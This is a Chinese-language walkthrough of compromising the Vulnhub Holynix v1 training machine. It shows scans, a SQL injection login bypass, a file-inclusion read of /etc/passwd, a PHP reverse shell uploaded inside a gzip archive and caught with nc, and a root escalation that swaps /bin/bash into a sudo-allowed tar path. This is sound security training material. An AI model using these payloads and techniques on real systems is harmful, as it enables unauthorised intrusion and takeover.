# Holynix 主机渗透实现

-   靶机地址：https://www.vulnhub.com/entry/holynix-v1,20/
-   下载地址：https://download.vulnhub.com/holynix/holynix-v1.tar.bz2



## 信息收集

### 主机发现

>   └─$ sudo netdiscover -i eth0 -r 192.168.2.1/24

```
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                      
         
 21 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1260                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.2.1     aa:a1:59:52:23:67      1      60  Unknown vendor                                   
 192.168.2.2     00:50:56:e9:75:ca     12     720  VMware, Inc.                                     
 192.168.2.254   00:50:56:e8:1f:af      5     300  VMware, Inc.                                     
 192.168.2.139   00:0c:29:bc:05:de      3     180  VMware, Inc.  
```

### 端口扫描

```shell
# 扫描TCP开放端口
└─$ nmap -sT -T 4 -p- 192.168.2.139 -oA Nmap-scan/sT-Ports                        
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 20:19 HKT
Nmap scan report for 192.168.2.139
Host is up (0.0014s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 5.39 seconds

```



### 服务扫描及操作系统探测

```shell
└─$ sudo nmap -sC -sV -O -p80 --min-rate 10000 192.168.2.139 -oA Nmap-scan/sC 
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 20:21 HKT
Nmap scan report for 192.168.2.139
Host is up (0.00057s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.12 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:BC:05:DE (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.24 - 2.6.25
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.08 seconds

```



### 默认脚本漏洞扫描

```shell
└─$ sudo nmap --script=vuln -p 80 192.168.2.139 -oA Nmap-scan/script
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-27 20:25 HKT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.139
Host is up (0.0012s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|   /login/: Login page
|   /home/: Potentially interesting folder
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting folder
|   /index/: Potentially interesting folder
|   /misc/: Potentially interesting folder
|   /transfer/: Potentially interesting folder
|_  /upload/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
MAC Address: 00:0C:29:BC:05:DE (VMware)

Nmap done: 1 IP address (1 host up) scanned in 345.63 seconds

```



## web发现

### 目录扫描

```shell
└─$ dirsearch -u http://192.168.2.139 -i 200,301,302

  _|. _ _  _  _  _ _|_    v0.4.2                                                                     
 (_||| _) (/_(_|| (_| )                                                                              
                                                                                                     
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/kali/.dirsearch/reports/192.168.2.139/_23-05-27_20-37-23.txt

Error Log: /home/kali/.dirsearch/logs/errors-23-05-27_20-37-23.log

Target: http://192.168.2.139/

[20:37:23] Starting: 
[20:37:39] 200 -   63B  - /footer                                           
[20:37:39] 200 -   63B  - /footer.php                                       
[20:37:39] 200 -  604B  - /header.php                                       
[20:37:39] 200 -  604B  - /header                                           
[20:37:40] 200 -  109B  - /home                                             
[20:37:40] 200 -  109B  - /home.php                                         
[20:37:40] 301 -  352B  - /img  ->  http://192.168.2.139/img/               
[20:37:40] 200 -  776B  - /index                                            
[20:37:40] 200 -  776B  - /index.php                                        
[20:37:40] 200 -  776B  - /index.php/login/                                 
[20:37:42] 200 -  342B  - /login                                            
[20:37:42] 200 -  342B  - /login.php                                        
[20:37:42] 200 -  342B  - /login/admin/admin.asp                            
[20:37:42] 200 -  342B  - /login/cpanel.html
[20:37:42] 200 -  342B  - /login/
[20:37:42] 200 -  342B  - /login/cpanel.php
[20:37:42] 200 -  342B  - /login/administrator/
[20:37:42] 200 -  342B  - /login/cpanel.jsp
[20:37:42] 200 -  342B  - /login/cpanel.aspx
[20:37:42] 200 -  342B  - /login/admin/
[20:37:42] 200 -  342B  - /login/index
[20:37:42] 200 -  342B  - /login/super                                      
[20:37:42] 200 -  342B  - /login/cpanel.js
[20:37:42] 200 -  342B  - /login/login                                      
[20:37:42] 200 -  342B  - /login/oauth/
[20:37:42] 200 -  342B  - /login/cpanel/
[20:37:44] 301 -  353B  - /misc  ->  http://192.168.2.139/misc/             
[20:37:53] 200 -   44B  - /transfer                                         
[20:37:54] 200 -   26B  - /upload/                                          
[20:37:54] 200 -   44B  - /upload.php                                       
[20:37:54] 301 -  355B  - /upload  ->  http://192.168.2.139/upload/         
[20:37:56] 301 -  353B  - /~bin  ->  http://192.168.2.139/~bin/             
[20:37:56] 301 -  356B  - /~backup  ->  http://192.168.2.139/~backup/
[20:37:56] 301 -  355B  - /~games  ->  http://192.168.2.139/~games/         
[20:37:56] 301 -  354B  - /~mail  ->  http://192.168.2.139/~mail/           
[20:37:56] 301 -  356B  - /~daemon  ->  http://192.168.2.139/~daemon/       
[20:37:56] 301 -  354B  - /~sync  ->  http://192.168.2.139/~sync/           
                                                                             
Task Completed
```

-   访问主页--> 发现有登陆按钮--> 观察url尝试文件包含漏洞

-   ![image-20230529101652462](https://raw.githubusercontent.com/r0o983/images/main/image-20230529101652462.png)

-   使用sql注入尝试对`username` 和`password`进行注入测试--> 经过尝试发现`password` 存在sql注入

-   ![image-20230529101912833](/Users/christopher/Library/Application Support/typora-user-images/image-20230529101912833.png)

-   尝试构造sql语句--> `' or 1=1 #`

-   ```shell
    # 完整的语句拼接为：
    SELECT * FROM accounts WHERE username='dsadsada' AND password=' ' or 1=1 #' 
    
    # 使用单引号将password语句闭合，使用or 使前面的语句失效
    ```

-   登陆成功，在`Message Board`中发现当前系统中可能存在其他用户

-   ![image-20230529103615026](https://raw.githubusercontent.com/r0o983/images/main/image-20230529103615026.png)

-   在`upload`中尝试上传webshell

-   ![image-20230529103726484](https://raw.githubusercontent.com/r0o983/images/main/image-20230529103726484.png)

-   当前用户被禁止上传文件至服务中，尝试使用其他用户进行登陆-->操作如下：

-   ```shell
    # 依然使用sql注入的方式来进行登陆，构造sql语句
    'or username='etenenbaum' #
    ```

-   ![image-20230529105435496](https://raw.githubusercontent.com/r0o983/images/main/image-20230529105435496.png)

-   尝试当前用户是否具有上传文件权限

-   ![image-20230529105528616](https://raw.githubusercontent.com/r0o983/images/main/image-20230529105528616.png)

-   文件上传成功，查找上传之后的路径进行利用获取反弹shell

-   查找当前网站是否存在有其他漏洞点

-   ![image-20230529111254783](https://raw.githubusercontent.com/r0o983/images/main/image-20230529111254783.png)

-   根据选择的文件名称不同，传递不同的参数到后台，尝试构建参数进行文件读取

-   成功读取到系统中的`/etc/passwd`文件内容

-   ![image-20230529111641039](https://raw.githubusercontent.com/r0o983/images/main/image-20230529111641039.png)

-   尝试读取`/etc/shadow`文件失败，根据之前文件上传时的提示，上传的位置应该是在当前用户的`/home`目录下，尝试访问

-   ![image-20230529113823496](https://raw.githubusercontent.com/r0o983/images/main/image-20230529113823496.png)

-   本机建立监听，获取反弹shell

-   ![image-20230529113919077](https://raw.githubusercontent.com/r0o983/images/main/image-20230529113919077.png)

-   文件读取失败，提示权限不足，在之前上传的文件中提示`The ownership of the uploaded file(s) have been changed accordingly.`**文件上传成功，但是更改了文件权限**。 所以继续尝试使用gzip压缩包进行上传，上传之后还是执行不了

-   继续使用文件包含漏洞查看`transfer.php`的页面源码

-   ![image-20230529120952370](https://raw.githubusercontent.com/r0o983/images/main/image-20230529120952370.png)

-   使用tar创建gzip文件

-   ```shell
    └─$ tar -zcf php-reverse-shell.php.gz php-reverse-shell.php
    
    
    参数：
    	-c 创建压缩包
    	-z 使用gzip格式进行压缩
    	-f 指定压缩名称
    ```
    
-   上传成功并成功执行

-   ![image-20230529205723082](https://raw.githubusercontent.com/r0o983/images/main/image-20230529205723082.png)

-   在本地建立监听，等待连接

-   ```shell
    └─$ nc -nvlp 1234
    listening on [any] 1234 ...
    connect to [192.168.2.128] from (UNKNOWN) [192.168.2.139] 51357
    Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
     23:15:28 up 20 min,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: can't access tty; job control turned off
    $ whoami
    www-data
    $ uname -a
    Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
    $ ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:bc:05:de brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.139/24 brd 192.168.2.255 scope global eth0
        inet6 fe80::20c:29ff:febc:5de/64 scope link 
           valid_lft forever preferred_lft forever
    
    
    
    ```

-   查看权限并尝试提权

-   ```shell
    $ sudo -l
    User www-data may run the following commands on this host:
        (root) NOPASSWD: /bin/chown
        (root) NOPASSWD: /bin/chgrp
        (root) NOPASSWD: /bin/tar
        (root) NOPASSWD: /bin/mv
    
    $ which python
    /usr/bin/python
    $ python -c 'import pty;pty.spawn("/bin/bash")';
    www-data@holynix:/$ whoami
    whoami
    www-data
    www-data@holynix:/$ 
    
    ```

-   开始提权：

-   ```shell
    www-data@holynix:/$ sudo mv /bin/tar /bin/tar.bak
    sudo mv /bin/tar /bin/tar.bak
    www-data@holynix:/$ sudo mv /bin/bash /bin/tar
    sudo mv /bin/bash /bin/tar
    www-data@holynix:/$ sudo /bin/tar
    sudo /bin/tar
    root@holynix:/# ls
    ls
    bin   cdrom  etc   initrd      lib         media  opt   root  srv  tmp  var
    boot  dev    home  initrd.img  lost+found  mnt    proc  sbin  sys  usr  vmlinuz
    root@holynix:/# whoami
    whoami
    root
    root@holynix:/# uname -a
    uname -a
    Linux holynix 2.6.24-26-server #1 SMP Tue Dec 1 19:19:20 UTC 2009 i686 GNU/Linux
    root@holynix:/# ip a
    ip a
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue 
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast qlen 1000
        link/ether 00:0c:29:bc:05:de brd ff:ff:ff:ff:ff:ff
        inet 192.168.2.139/24 brd 192.168.2.255 scope global eth0
        inet6 fe80::20c:29ff:febc:5de/64 scope link 
           valid_lft forever preferred_lft forever
    root@holynix:/# 
    
    ```

-   **思路：使用`sudo mv ` 指令进行提权，此处先将tar命令给备份，然后使用move指令将系统级的shell也就是`/etc/bash`给替换到可以执行tar命令处,再执行tar命令，此时调用的已经是`/bin/bash`这个命令**
